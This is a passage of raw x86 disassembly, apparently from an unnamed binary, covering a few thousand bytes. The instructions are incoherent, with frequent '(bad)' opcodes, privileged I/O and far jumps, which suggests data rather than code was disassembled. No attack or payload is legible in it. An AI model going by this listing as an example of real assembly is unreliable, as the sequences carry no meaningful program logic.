  415565:	mov    edx,0x4211a489
  41556a:	cdq    
  41556b:	repz push edi
  41556d:	inc    esi
  41556e:	push   edx
  41556f:	xchg   edi,eax
  415570:	pusha  
  415571:	jp     0x415583
  415573:	fwait
  415574:	retf   
  415575:	add    BYTE PTR [edi+0x5d],bh
  415578:	das    
  415579:	pop    esp
  41557a:	dec    esp
  41557b:	(bad)  
  41557c:	hlt    
  41557d:	pop    es
  41557e:	fcomp  QWORD PTR [ebp+0x77]
  415581:	daa    
  415582:	pushf  
  415583:	fild   QWORD PTR [edx+0x74]
  415586:	add    dl,bl
  415588:	int    0x7f
  41558a:	out    0x68,al
  41558c:	stos   DWORD PTR es:[edi],eax
  41558d:	mov    bh,BYTE PTR [ebp+0x54d79eb5]
  415593:	ret    
  415594:	repz push cs
  415596:	and    esi,DWORD PTR ds:0xfdda9c4c
  41559c:	push   DWORD PTR [ebx]
  41559e:	sub    ah,bh
  4155a0:	dec    esi
  4155a1:	push   ebp
  4155a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155a3:	jmp    0xe340:0xdc78293b
  4155aa:	jecxz  0x41558a
  4155ac:	adc    al,0xd7
  4155ae:	cmp    DWORD PTR [esi],0x66d1579f
  4155b4:	ds loopne 0x41561b
  4155b7:	aam    0xc7
  4155b9:	(bad)  
  4155ba:	jnp    0x41555f
  4155bc:	pop    ebx
  4155bd:	mov    cl,0x59
  4155bf:	js     0x415544
  4155c1:	adc    BYTE PTR [eax+0x37],0x4d
  4155c5:	dec    edi
  4155c6:	imul   edi,DWORD PTR [ebx+0x47da9209],0xded0f875
  4155d0:	idiv   bl
  4155d2:	outs   dx,DWORD PTR ds:[esi]
  4155d3:	retf   
  4155d4:	mov    edx,esp
  4155d6:	and    dl,al
  4155d8:	aaa    
  4155d9:	rol    BYTE PTR [eax-0x56f710d9],1
  4155df:	adc    eax,0xc6f59afb
  4155e4:	popa   
  4155e5:	sub    al,0x50
  4155e7:	mov    ecx,edi
  4155e9:	hlt    
  4155ea:	and    al,0x96
  4155ec:	sbb    edi,DWORD PTR [ebx-0xabf2146]
  4155f2:	or     al,0x17
  4155f4:	fist   WORD PTR [ebx]
  4155f6:	mov    edi,0x366151ad
  4155fb:	cs (bad) 
  4155fd:	mov    bl,0x49
  4155ff:	retf   
  415600:	pushf  
  415601:	(bad)  
  415602:	mov    al,0x7e
  415604:	fst    DWORD PTR [ecx-0x6e3e79a5]
  41560a:	bound  eax,QWORD PTR [ecx-0x2818eb32]
  415610:	enter  0x876e,0x72
  415614:	cmp    ch,BYTE PTR [eax+ecx*8-0x3911302c]
  41561b:	or     eax,DWORD PTR [esi+0x23]
  41561e:	and    eax,0x9b71e3aa
  415623:	and    ecx,esi
  415625:	(bad)  
  415626:	pop    esi
  415627:	ja     0x4155b1
  415629:	jle    0x4155ce
  41562b:	jg     0x4155c0
  41562d:	fcomp  QWORD PTR [eax+0xd]
  415630:	addr16 adc eax,0xa1b1c7e1
  415636:	mov    dh,BYTE PTR [edi-0x6d61c39a]
  41563c:	or     esi,DWORD PTR [eax+0x3b44b1a6]
  415642:	ret    
  415643:	mov    eax,0xd4c59ee5
  415648:	sub    DWORD PTR [ecx+eiz*8-0x3cbe9a62],esi
  41564f:	lea    edi,[ecx]
  415651:	inc    esi
  415652:	adc    esi,DWORD PTR [eax]
  415654:	pop    ds
  415655:	aas    
  415656:	sar    DWORD PTR [ecx+ebx*1-0x3efea8a6],0xe0
  41565e:	mov    edx,0x4527ebc7
  415663:	push   edi
  415664:	pop    edi
  415665:	jno    0x4156a6
  415667:	adc    eax,0xacabd14f
  41566c:	mov    edx,0xdfa4bd7f
  415671:	aad    0x98
  415673:	pop    ss
  415674:	popf   
  415675:	in     al,dx
  415676:	xor    DWORD PTR [edx],0xa5b6e59a
  41567c:	push   esp
  41567d:	add    al,0x20
  41567f:	fsub   st,st(4)
  415681:	lods   eax,DWORD PTR ds:[esi]
  415682:	mov    cl,0x94
  415684:	mov    ds:0x3ff2cd3b,eax
  415689:	rcl    esi,0x28
  41568c:	es inc ecx
  41568e:	xor    eax,0x91b90339
  415693:	test   al,0x78
  415695:	jl     0x41569e
  415697:	fiadd  WORD PTR [ebp-0x5f40a99c]
  41569d:	and    DWORD PTR [ecx-0x5dc146ac],eax
  4156a3:	pop    ebx
  4156a4:	add    bl,BYTE PTR [edi-0x2a]
  4156a7:	xchg   esp,eax
  4156a8:	xchg   edx,eax
  4156a9:	mov    dh,0x45
  4156ab:	outs   dx,BYTE PTR ds:[esi]
  4156ac:	mov    bh,0xd3
  4156ae:	inc    esp
  4156af:	sub    esi,DWORD PTR [esi+eiz*4+0x70118fe2]
  4156b6:	mov    ch,0xfc
  4156b8:	xor    DWORD PTR [ecx-0x5b],edi
  4156bb:	fdivr  DWORD PTR [edi]
  4156bd:	popf   
  4156be:	add    cl,BYTE PTR [ebx]
  4156c0:	ret    
  4156c1:	jb     0x4156fe
  4156c3:	in     al,dx
  4156c4:	outs   dx,BYTE PTR ds:[esi]
  4156c5:	mov    edi,0x3bb0dd45
  4156ca:	sbb    al,0x22
  4156cc:	jns    0x415678
  4156ce:	jg     0x41567d
  4156d0:	test   eax,0xe2d43325
  4156d5:	aam    0x8c
  4156d7:	mov    dh,0x9c
  4156d9:	jne    0x41572f
  4156db:	or     al,0x9c
  4156dd:	or     edx,0x54
  4156e0:	jnp    0x4156e8
  4156e2:	lock xchg edx,eax
  4156e4:	inc    eax
  4156e5:	inc    ecx
  4156e6:	fdivr  st,st(2)
  4156e8:	lock gs js 0x415767
  4156ec:	mov    ebx,0x9c95de4b
  4156f1:	inc    ebx
  4156f2:	das    
  4156f3:	pop    edi
  4156f4:	lds    edx,FWORD PTR [eax+eiz*1]
  4156f7:	popf   
  4156f8:	sub    DWORD PTR [edi-0x4a79d7b2],ebp
  4156fe:	cld    
  4156ff:	push   edx
  415700:	mov    ebx,0x2b5b8390
  415705:	pop    ss
  415706:	rcl    DWORD PTR ds:0x2252c71c,cl
  41570c:	sub    al,BYTE PTR [eax-0x59]
  41570f:	mov    WORD PTR [esi],?
  415711:	adc    BYTE PTR [ecx-0x6b],ch
  415714:	rcr    DWORD PTR [eax+edx*1-0x7962324d],1
  41571b:	retf   0x5659
  41571e:	xchg   esp,eax
  41571f:	mov    ebp,0xb06cad15
  415724:	inc    edi
  415725:	aam    0x4f
  415727:	dec    esi
  415728:	jae    0x41575d
  41572a:	jecxz  0x415744
  41572c:	mov    edx,0x888ff4b
  415731:	enter  0x2ad2,0x3d
  415735:	mov    ah,BYTE PTR [esi]
  415737:	add    eax,0xe895b32a
  41573c:	popf   
  41573d:	sub    ebx,edx
  41573f:	push   0xffffffce
  415741:	or     BYTE PTR [esi+ecx*2-0x1f],cl
  415745:	ins    DWORD PTR es:[edi],dx
  415746:	fidiv  WORD PTR [eax-0x6adbf14a]
  41574c:	(bad)  
  41574d:	loope  0x415714
  41574f:	xchg   esi,eax
  415750:	(bad)  
  415751:	sub    al,0x4c
  415753:	(bad)  
  415754:	mov    ah,0xb1
  415756:	pop    ebp
  415757:	aad    0x14
  415759:	cmp    eax,0xa0c93f5f
  41575e:	push   0xffffffce
  415760:	sub    dl,BYTE PTR [ebx]
  415762:	jnp    0x415793
  415764:	or     al,0x9
  415766:	mov    edi,0xf5b024d5
  41576b:	addr16 out 0x60,al
  41576e:	in     eax,0x6e
  415770:	das    
  415771:	jo     0x41576a
  415773:	and    eax,0xe3af8f27
  415778:	xchg   ebp,eax
  415779:	cmp    DWORD PTR [ebx+0x59eb9825],edx
  41577f:	rol    DWORD PTR [ecx],cl
  415781:	mov    bh,0xa0
  415783:	adc    edi,DWORD PTR [edx-0x42cfd71e]
  415789:	xor    DWORD PTR ds:0x2bd92293,ecx
  41578f:	or     ebx,DWORD PTR [eax]
  415791:	test   al,0xb1
  415793:	(bad)  
  415795:	jmp    0x288ed49d
  41579a:	mov    bl,0x15
  41579c:	repz jmp 0xe16a:0x2569c58c
  4157a4:	inc    eax
  4157a5:	scas   al,BYTE PTR es:[edi]
  4157a6:	out    dx,eax
  4157a7:	or     esp,DWORD PTR [edx+0x63]
  4157aa:	jb     0x41578e
  4157ac:	or     ebx,DWORD PTR [ebx]
  4157ae:	lea    edi,[ecx+0x5a65a33b]
  4157b4:	int    0x6f
  4157b6:	mov    ebx,0xac5676eb
  4157bb:	(bad)  
  4157bc:	jmp    0x7df1216c
  4157c1:	xchg   esi,eax
  4157c2:	sbb    BYTE PTR [ecx-0x392f9037],dl
  4157c8:	adc    al,0x54
  4157ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cb:	test   eax,0xb2dedf12
  4157d0:	retf   
  4157d1:	aad    0x5c
  4157d3:	(bad)  
  4157d4:	call   FWORD PTR [ebx-0x80]
  4157d7:	outs   dx,DWORD PTR ds:[esi]
  4157d8:	scas   eax,DWORD PTR es:[edi]
  4157d9:	pop    ebp
  4157da:	sbb    BYTE PTR [ebx],dh
  4157dc:	push   ss
  4157dd:	dec    edx
  4157de:	retf   
  4157df:	adc    eax,0xf5468e17
  4157e4:	inc    esi
  4157e5:	jle    0x4157f3
  4157e7:	jle    0x415770
  4157e9:	adc    ebp,edi
  4157eb:	or     edi,DWORD PTR [edx]
  4157ed:	test   BYTE PTR [esi+ebp*4-0x42b25832],bl
  4157f4:	jp     0x4157c8
  4157f6:	pop    ds
  4157f7:	adc    DWORD PTR [edi+0x754d55a6],edi
  4157fd:	pop    es
  4157fe:	mov    esp,edi
  415800:	cmp    al,0xa7
  415802:	add    esi,DWORD PTR [ebp-0x1f]
  415805:	inc    ecx
  415806:	jle    0x415829
  415808:	mov    BYTE PTR [edx],dl
  41580a:	add    al,0xe0
  41580c:	pop    ebx
  41580d:	jg     0x415884
  41580f:	mov    dh,0x7f
  415811:	mov    BYTE PTR [ebp-0x609c82d4],dl
  415817:	jne    0x4157b4
  415819:	(bad)  
  41581a:	sbb    eax,0xca83c871
  41581f:	mov    esp,DWORD PTR [eax-0x40bf3144]
  415825:	and    bh,0xcc
  415828:	mov    eax,0x8eb385d
  41582d:	jne    0x4157f8
  41582f:	sahf   
  415830:	test   DWORD PTR [ecx-0x7a],ecx
  415833:	jbe    0x415867
  415835:	sub    BYTE PTR [eax-0x6667e930],bh
  41583b:	loop   0x415801
  41583d:	adc    eax,0xd9a5cbd
  415842:	sub    al,0x2e
  415844:	xchg   BYTE PTR [ebx-0x17ec5c27],dh
  41584a:	pop    eax
  41584b:	in     al,0x25
  41584d:	add    eax,0xa5ffc3c
  415852:	daa    
  415853:	lds    edx,FWORD PTR [edi+0x5a]
  415856:	mov    esi,0xd593c590
  41585b:	add    dl,BYTE PTR [esi+0x40]
  41585e:	xor    bh,dh
  415860:	sub    al,0xfb
  415862:	into   
  415863:	push   ebx
  415864:	mov    ebx,0x2e8df7b8
  415869:	and    esp,edi
  41586b:	ins    DWORD PTR es:[edi],dx
  41586c:	inc    ebx
  41586d:	jae    0x41589e
  41586f:	sti    
  415870:	mov    ds:0x9cdb6344,eax
  415875:	push   ebp
  415876:	pushf  
  415877:	xor    esp,edi
  415879:	jmp    0x21a134c1
  41587e:	dec    edx
  41587f:	sub    ecx,0x91bca8fa
  415885:	stos   BYTE PTR es:[edi],al
  415886:	mov    gs,WORD PTR [edi]
  415888:	mov    al,0x44
  41588a:	adc    al,0x77
  41588c:	xor    eax,0x43592418
  415891:	xchg   esi,eax
  415892:	mov    edi,0x20a1f90c
  415897:	inc    esp
  415898:	ins    DWORD PTR es:[edi],dx
  415899:	push   cs
  41589a:	jns    0x4158b2
  41589c:	dec    esi
  41589d:	cmp    DWORD PTR [ecx+0x2d],ebx
  4158a0:	xor    esp,DWORD PTR [ecx+0x60]
  4158a3:	cli    
  4158a4:	mov    BYTE PTR [ecx+0x1b],bh
  4158a7:	loop   0x41587e
  4158a9:	add    eax,DWORD PTR [eax+0x2e672b93]
  4158af:	and    ch,0x64
  4158b2:	cli    
  4158b3:	(bad)  
  4158b4:	cmc    
  4158b5:	xchg   ebx,eax
  4158b6:	loope  0x415923
  4158b8:	push   ebp
  4158b9:	cli    
  4158ba:	or     ah,BYTE PTR [ebx]
  4158bc:	and    ecx,DWORD PTR [ecx]
  4158be:	mov    ah,0xa9
  4158c0:	jmp    0xf369c1c6
  4158c5:	add    BYTE PTR [ebx+0x752bf779],al
  4158cb:	lock cmc 
  4158cd:	cmp    DWORD PTR [edi-0x64dc335],eax
  4158d3:	clc    
  4158d4:	push   ebx
  4158d5:	aaa    
  4158d6:	inc    edi
  4158d7:	or     bh,BYTE PTR [esp+edx*1-0x43f3b4be]
  4158de:	jno    0x4158d1
  4158e0:	cmp    eax,0xb0e6fab7
  4158e5:	arpl   WORD PTR [ebx-0x79daf43],dx
  4158eb:	sar    edx,cl
  4158ed:	fwait
  4158ee:	in     eax,0x78
  4158f0:	jle    0x415959
  4158f2:	adc    DWORD PTR [edx],0x7ee75f0a
  4158f8:	call   0xee2b9d7f
  4158fd:	mov    BYTE PTR [ebp+0x3b7b8207],bh
  415903:	add    bh,BYTE PTR [edi]
  415905:	xchg   ebx,eax
  415906:	std    
  415907:	test   DWORD PTR [ebx+0x1638e2aa],0x3f37f90c
  415911:	mov    WORD PTR [ecx-0x4b],?
  415914:	(bad)  
  415915:	mov    ecx,0x588e9545
  41591a:	leave  
  41591b:	sub    DWORD PTR [edi],ebp
  41591d:	fst    QWORD PTR [edi+0x46]
  415920:	ins    BYTE PTR es:[edi],dx
  415921:	or     BYTE PTR [ecx],dl
  415923:	add    DWORD PTR [esp+edi*2-0x66],eax
  415927:	dec    edi
  415928:	push   ebp
  415929:	mov    ecx,0x5238e0d7
  41592e:	adc    DWORD PTR [ecx+0x32],esi
  415931:	push   0xe30bb623
  415936:	push   eax
  415937:	mov    ch,0x1c
  415939:	mov    BYTE PTR [esi+0x6e],ch
  41593c:	mov    ecx,0x80611d94
  415941:	jnp    0x41591d
  415943:	adc    BYTE PTR [edi],ah
  415945:	sbb    al,0x6c
  415947:	hlt    
  415948:	repnz jmp 0xbd2d:0x7a443963
  415950:	mov    dl,cl
  415952:	cmp    DWORD PTR [ecx],0x2d338eb5
  415958:	gs dec edi
  41595a:	sub    cl,BYTE PTR [esi-0x5205add8]
  415960:	popf   
  415961:	imul   esp,ecx,0xfffffff2
  415964:	inc    eax
  415965:	mov    dh,BYTE PTR [ebx]
  415967:	sti    
  415968:	mov    BYTE PTR [ebp-0x24],dh
  41596b:	iret   
  41596c:	pop    eax
  41596d:	stos   DWORD PTR es:[edi],eax
  41596e:	les    edi,FWORD PTR [edx-0x16f6f132]
  415974:	test   DWORD PTR [eax-0x36],0xe7da0e10
  41597b:	mov    esi,DWORD PTR [ebx-0xc]
  41597e:	out    0xa0,al
  415980:	sub    ebx,eax
  415982:	in     al,dx
  415983:	inc    ebx
  415984:	dec    ebp
  415985:	addr16 mov bh,0xc8
  415988:	cs sbb eax,0xdc67c63e
  41598e:	mov    DWORD PTR [ebx],0xe1d8797c
  415994:	jnp    0x4159da
  415996:	sar    eax,cl
  415998:	adc    BYTE PTR [ebx-0x51d6e411],0xb
  41599f:	ret    
  4159a0:	xor    al,0x8d
  4159a2:	imul   ecx,DWORD PTR [esi+0x50b4c3b1],0x76ba09e
  4159ac:	(bad)  
  4159ad:	ins    BYTE PTR es:[edi],dx
  4159ae:	in     eax,0x20
  4159b0:	data16 ins BYTE PTR es:[edi],dx
  4159b2:	push   ebp
  4159b3:	sub    BYTE PTR [esi],0xaf
  4159b6:	lahf   
  4159b7:	dec    ecx
  4159b8:	out    dx,al
  4159b9:	sub    ch,bl
  4159bb:	mov    eax,ds:0x3d0adeb
  4159c0:	retf   
  4159c1:	dec    eax
  4159c2:	imul   ebx,DWORD PTR [ecx+eax*1],0xffffffe0
  4159c6:	mov    ebp,eax
  4159c8:	das    
  4159c9:	nop
  4159ca:	das    
  4159cb:	jg     0x4159b0
  4159cd:	jle    0x415a4e
  4159cf:	jmp    0xe1c8:0x5bd0cbb3
  4159d6:	pusha  
  4159d7:	fmulp  st(1),st
  4159d9:	cmp    eax,0x219e152e
  4159de:	imul   edx,DWORD PTR [ebx],0xffffff88
  4159e1:	and    DWORD PTR [edx+0x57c28898],0x1cc30a97
  4159eb:	push   ss
  4159ec:	adc    eax,0xa4bd2486
  4159f1:	or     eax,0xb849d88f
  4159f6:	inc    ecx
  4159f7:	mov    BYTE PTR [ecx-0x11],dl
  4159fa:	or     eax,0xe5ebbadf
  4159ff:	xor    BYTE PTR [edi],bh
  415a01:	jns    0x415a68
  415a03:	inc    edx
  415a04:	outs   dx,BYTE PTR ds:[esi]
  415a05:	jns    0x4159e7
  415a07:	out    0x47,al
  415a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0a:	jmp    0x415994
  415a0c:	ror    DWORD PTR [eax],cl
  415a0e:	fwait
  415a0f:	inc    edi
  415a10:	ror    DWORD PTR [edx*1-0x49fdeb4a],1
  415a17:	into   
  415a18:	rcr    ebp,1
  415a1a:	dec    eax
  415a1b:	loopne 0x415a4d
  415a1d:	scas   eax,DWORD PTR es:[edi]
  415a1e:	pop    ss
  415a1f:	jae    0x415a0d
  415a21:	repz loop 0x415a6c
  415a24:	cmp    dh,BYTE PTR [ebp-0x2]
  415a27:	inc    esp
  415a28:	sub    ebx,DWORD PTR [edx-0x50]
  415a2b:	adc    BYTE PTR [edx+ebx*4-0x5ea23563],0x8f
  415a33:	sbb    eax,0xd636fa8f
  415a38:	out    dx,eax
  415a39:	mov    bl,0x7e
  415a3b:	sub    esi,DWORD PTR [esi-0x538f2208]
  415a41:	ins    DWORD PTR es:[edi],dx
  415a42:	leave  
  415a43:	es jo  0x415a70
  415a46:	sar    BYTE PTR [ebp-0x36],0x4d
  415a4a:	cmp    edi,DWORD PTR [esi-0x2a3f917f]
  415a50:	adc    eax,0x6c06e10e
  415a55:	lock ds je 0x415a18
  415a59:	inc    ecx
  415a5a:	inc    esp
  415a5b:	cmp    al,0x0
  415a5d:	add    dl,ah
  415a5f:	fcomp  DWORD PTR [ebx+0x3659492c]
  415a65:	jmp    0x415a9f
  415a67:	leave  
  415a68:	int3   
  415a69:	jp     0x415a53
  415a6b:	imul   ebp,DWORD PTR [edx+0x55029dae],0x1e
  415a72:	shr    cl,cl
  415a74:	push   0x1c
  415a76:	fmul   QWORD PTR [edx-0xa]
  415a79:	pop    ss
  415a7a:	mov    edx,0x70d86d62
  415a7f:	mov    bl,0x29
  415a81:	popa   
  415a82:	mov    ss,WORD PTR [ebx+0x7955bce1]
  415a88:	push   ecx
  415a89:	jge    0x415a2a
  415a8b:	popf   
  415a8c:	int3   
  415a8d:	shr    BYTE PTR [ecx+0x5bfbac67],1
  415a93:	sbb    eax,0x1c75cc24
  415a98:	and    al,0xa7
  415a9a:	rcl    DWORD PTR [edi-0x4c],cl
  415a9d:	adc    eax,DWORD PTR [ebx]
  415a9f:	pop    ds
  415aa0:	jbe    0x415a56
  415aa2:	icebp  
  415aa3:	mov    WORD PTR [edi-0x49],cs
  415aa6:	out    dx,al
  415aa7:	mov    cl,bl
  415aa9:	inc    edi
  415aaa:	cmp    al,0x6a
  415aac:	cmc    
  415aad:	popa   
  415aae:	sub    DWORD PTR ds:0x8e565697,esp
  415ab4:	daa    
  415ab5:	stos   DWORD PTR es:[edi],eax
  415ab6:	loope  0x415b14
  415ab8:	xor    eax,0x901fe626
  415abd:	dec    edi
  415abe:	je     0x415ab7
  415ac0:	add    al,0x51
  415ac2:	jle    0x415acd
  415ac4:	and    eax,0xd8873dbe
  415ac9:	je     0x415b1a
  415acb:	jbe    0x415ad8
  415acd:	lea    esp,[eax+0x78]
  415ad0:	adc    al,0x2c
  415ad2:	xchg   edx,eax
  415ad3:	idiv   BYTE PTR [esi-0x57]
  415ad6:	into   
  415ad7:	lods   eax,DWORD PTR ds:[esi]
  415ad8:	and    DWORD PTR [ecx+0x4d],ebx
  415adb:	dec    ebp
  415adc:	enter  0x3019,0x27
  415ae0:	cwde   
  415ae1:	pop    eax
  415ae2:	sub    ch,BYTE PTR [eax-0x115321df]
  415ae8:	jl     0x415ac8
  415aea:	push   ebx
  415aeb:	icebp  
  415aec:	shl    dh,0xe8
  415aef:	mov    ebp,0x498c3905
  415af4:	dec    edi
  415af5:	fwait
  415af6:	and    eax,0xc1f4b430
  415afb:	dec    ecx
  415afc:	mov    ecx,0x8e945c63
  415b01:	icebp  
  415b02:	test   BYTE PTR [ecx-0x79d6add],cl
  415b08:	(bad)  
  415b09:	int3   
  415b0a:	in     al,0x2a
  415b0c:	pop    ecx
  415b0d:	sets   BYTE PTR [esi-0x6b48615f]
  415b14:	scas   eax,DWORD PTR es:[edi]
  415b15:	js     0x415abd
  415b17:	jmp    0x415ad5
  415b19:	es arpl cx,dx
  415b1c:	or     al,0xba
  415b1e:	xor    dh,BYTE PTR [eax-0x210db287]
  415b24:	mov    esi,0xe017a215
  415b29:	(bad)  
  415b2a:	shl    esi,cl
  415b2c:	mov    bh,0x82
  415b2e:	in     eax,dx
  415b2f:	ret    0xda0
  415b32:	(bad)  
  415b34:	aam    0xc4
  415b36:	jnp    0x415b51
  415b38:	jmp    ecx
  415b3a:	ror    BYTE PTR [esi],cl
  415b3c:	pop    esp
  415b3d:	jp     0x415b46
  415b3f:	or     bh,BYTE PTR [eax-0x63]
  415b42:	or     DWORD PTR [ecx-0x4f],ebp
  415b45:	xor    dl,BYTE PTR [esi+0x4e]
  415b48:	pop    ss
  415b49:	cmp    ebx,DWORD PTR [esp+eiz*2]
  415b4c:	xor    ebx,DWORD PTR [esi+0x3611ff8e]
  415b52:	into   
  415b53:	push   ss
  415b54:	dec    ebx
  415b55:	adc    eax,0xc6e991b7
  415b5a:	lds    edx,FWORD PTR [ebx+ecx*1+0x16ab32aa]
  415b61:	jbe    0x415b24
  415b63:	leave  
  415b64:	mov    edi,0x40c19c19
  415b69:	test   al,0x9f
  415b6b:	sbb    cl,BYTE PTR [ebp+0x67]
  415b6e:	xchg   esp,eax
  415b6f:	inc    ecx
  415b70:	fist   DWORD PTR [edx]
  415b72:	pop    ss
  415b73:	popa   
  415b74:	(bad)  
  415b75:	mov    ds:0x98ad198e,al
  415b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b7b:	test   BYTE PTR [edx-0x5b],dh
  415b7e:	and    al,0x47
  415b80:	(bad)  
  415b81:	retf   
  415b82:	out    0x62,eax
  415b84:	(bad)  
  415b85:	call   FWORD PTR [edi]
  415b87:	test   edi,0x3f849377
  415b8d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  415b8f:	(bad)  
  415b90:	mov    esp,esi
  415b92:	sub    DWORD PTR [esi+0x7e],0x36
  415b96:	sub    eax,0x17c9ca76
  415b9b:	push   ss
  415b9c:	adc    eax,0x83ca963b
  415ba1:	iret   
  415ba2:	hlt    
  415ba3:	or     al,0x91
  415ba5:	in     al,dx
  415ba6:	rol    BYTE PTR [edi],1
  415ba8:	std    
  415ba9:	in     al,0xec
  415bab:	dec    ebx
  415bac:	or     dl,bl
  415bae:	sub    eax,0xb20847d2
  415bb3:	inc    edi
  415bb4:	mov    dl,0x63
  415bb6:	out    0x7b,eax
  415bb8:	jge    0x415be2
  415bba:	xchg   edx,eax
  415bbb:	rol    esi,0xef
  415bbe:	sbb    eax,0xea678983
  415bc3:	addr16 mov cl,0xa
  415bc6:	test   DWORD PTR [esi],esp
  415bc8:	dec    edx
  415bc9:	push   ss
  415bca:	stc    
  415bcb:	adc    BYTE PTR [eax],0x46
  415bce:	push   ebp
  415bcf:	push   es
  415bd0:	sub    BYTE PTR [ecx-0x33f46d73],cl
  415bd6:	(bad)  
  415bd7:	ins    BYTE PTR es:[edi],dx
  415bd8:	stc    
  415bd9:	pop    ds
  415bda:	std    
  415bdb:	sar    DWORD PTR [esi-0x1],1
  415bde:	jno    0x415c38
  415be0:	adc    eax,DWORD PTR [esi+0x43]
  415be3:	imul   edx,DWORD PTR [edx+eax*4-0x39],0x23e5e43c
  415beb:	jo     0x415bda
  415bed:	out    dx,al
  415bee:	aaa    
  415bef:	in     al,0xbd
  415bf1:	pop    ds
  415bf2:	sar    BYTE PTR [esi-0x42208be5],cl
  415bf8:	retf   0xf4d1
  415bfb:	repnz lods al,BYTE PTR ds:[esi]
  415bfd:	loop   0x415c44
  415bff:	or     edi,ecx
  415c01:	xchg   BYTE PTR [edx+0x3f54c4c],cl
  415c07:	cdq    
  415c08:	mov    edx,0xde8be204
  415c0d:	cmp    al,0x5b
  415c0f:	jae    0x415c57
  415c11:	cmc    
  415c12:	pop    edx
  415c13:	push   ds
  415c14:	mov    bh,0x79
  415c16:	lds    eax,FWORD PTR [edx+0x53b33300]
  415c1c:	mov    dh,ch
  415c1e:	aaa    
  415c1f:	pop    esp
  415c20:	push   es
  415c21:	ret    
  415c22:	inc    edi
  415c23:	aad    0xb5
  415c25:	imul   ebx,ebx,0x5b
  415c28:	mov    DWORD PTR [eax-0x65],esi
  415c2b:	sbb    esp,DWORD PTR [esi-0x60]
  415c2e:	ret    
  415c2f:	dec    esi
  415c30:	jmp    0x90e:0x39980d21
  415c37:	xor    ebp,DWORD PTR [edi+0x32]
  415c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c3b:	cli    
  415c3c:	sub    eax,0x75f97263
  415c41:	cmp    DWORD PTR [edi+0x2d],0x13
  415c45:	dec    ebp
  415c46:	outs   dx,DWORD PTR ds:[esi]
  415c47:	dec    edi
  415c48:	cmovno ebx,DWORD PTR [esi+0x5f]
  415c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4d:	lea    edx,[edi-0x158f6247]
  415c53:	fs pop ecx
  415c55:	popa   
  415c56:	xor    esp,ebx
  415c58:	inc    edi
  415c59:	and    esi,ebx
  415c5b:	lods   eax,DWORD PTR ds:[esi]
  415c5c:	inc    edi
  415c5d:	fwait
  415c5e:	ds scas al,BYTE PTR es:[edi]
  415c60:	loop   0x415ca6
  415c62:	lods   al,BYTE PTR ds:[esi]
  415c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c64:	mov    cl,0x9b
  415c66:	aaa    
  415c67:	jge    0x415bf7
  415c69:	sub    edi,DWORD PTR [edx]
  415c6b:	dec    edx
  415c6c:	jae    0x415c49
  415c6e:	and    cx,bp
  415c71:	cmc    
  415c72:	push   esi
  415c73:	jb     0x415cd6
  415c75:	imul   BYTE PTR [ecx-0xe]
  415c78:	dec    esp
  415c79:	inc    ebp
  415c7a:	xchg   ebx,eax
  415c7b:	jle    0x415c71
  415c7d:	push   0xd2a5402c
  415c82:	jge    0x415c2c
  415c84:	in     al,0x52
  415c86:	jbe    0x415cbc
  415c88:	xchg   ecx,eax
  415c89:	rcr    BYTE PTR [ecx],cl
  415c8b:	shr    ebp,cl
  415c8d:	mov    edi,0x5bcf13a0
  415c92:	js     0x415c19
  415c94:	fist   WORD PTR [edx+0x18118349]
  415c9a:	lahf   
  415c9b:	jmp    0xc9841c2b
  415ca0:	mov    ebx,0x534861c
  415ca5:	sub    al,0x30
  415ca7:	xor    edx,DWORD PTR [ebx+0xf549335]
  415cad:	in     al,dx
  415cae:	pop    es
  415caf:	mov    ds:0x70fb07c2,eax
  415cb4:	ret    
  415cb5:	mov    bh,BYTE PTR [edi-0x73f44fdd]
  415cbb:	dec    edi
  415cbc:	cmp    ecx,eax
  415cbe:	inc    ecx
  415cbf:	clc    
  415cc0:	push   esp
  415cc1:	mov    dl,0x1a
  415cc3:	ss push ebp
  415cc5:	addr16 mov eax,ds:0x84c2
  415cc9:	pushf  
  415cca:	scas   eax,DWORD PTR es:[edi]
  415ccb:	out    dx,al
  415ccc:	sub    eax,0x20802cc7
  415cd1:	dec    edi
  415cd2:	test   ecx,edi
  415cd4:	stos   DWORD PTR es:[edi],eax
  415cd5:	int    0x39
  415cd7:	sbb    ah,ch
  415cd9:	or     BYTE PTR [ecx],0xf
  415cdc:	mov    ds:0x97b02b01,eax
  415ce1:	sbb    eax,0xa67339ba
  415ce6:	push   ds
  415ce7:	cld    
  415ce8:	jecxz  0x415cb3
  415cea:	clc    
  415ceb:	int3   
  415cec:	call   0xb89e41f1
  415cf1:	clc    
  415cf2:	bound  ebx,QWORD PTR [ebp+0x299d2ec1]
  415cf8:	inc    ebp
  415cf9:	pop    edx
  415cfa:	jnp    0x415d1c
  415cfc:	(bad)  
  415cfd:	gs xchg edx,eax
  415cff:	jmp    0xf3859d5a
  415d04:	xlat   BYTE PTR ds:[ebx]
  415d05:	pop    ds
  415d06:	inc    eax
  415d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d08:	push   ecx
  415d09:	dec    edi
  415d0a:	and    dh,BYTE PTR [edx-0x7fe59005]
  415d10:	push   0x26
  415d12:	outs   dx,DWORD PTR ds:[esi]
  415d13:	push   ebx
  415d14:	jle    0x415d25
  415d16:	js     0x415d39
  415d18:	mov    edi,0x27b43f6b
  415d1d:	sub    BYTE PTR [eax+0xe4cf009],bl
  415d23:	aas    
  415d24:	jmp    0x4636634f
  415d29:	in     al,0xe3
  415d2b:	leave  
  415d2c:	jle    0x415d14
  415d2e:	cld    
  415d2f:	les    ebx,FWORD PTR [ecx+0x27]
  415d32:	mov    esp,edx
  415d34:	dec    ebp
  415d35:	push   ecx
  415d36:	ror    edx,0x19
  415d39:	mov    edi,0x9d0f41f9
  415d3e:	xchg   ecx,eax
  415d3f:	jl     0x415cfd
  415d41:	hlt    
  415d42:	and    dl,BYTE PTR [ecx-0x7d]
  415d45:	sbb    DWORD PTR [edi+0x57],eax
  415d48:	or     al,0x9f
  415d4a:	es push es
  415d4c:	inc    edi
  415d4d:	aad    0x82
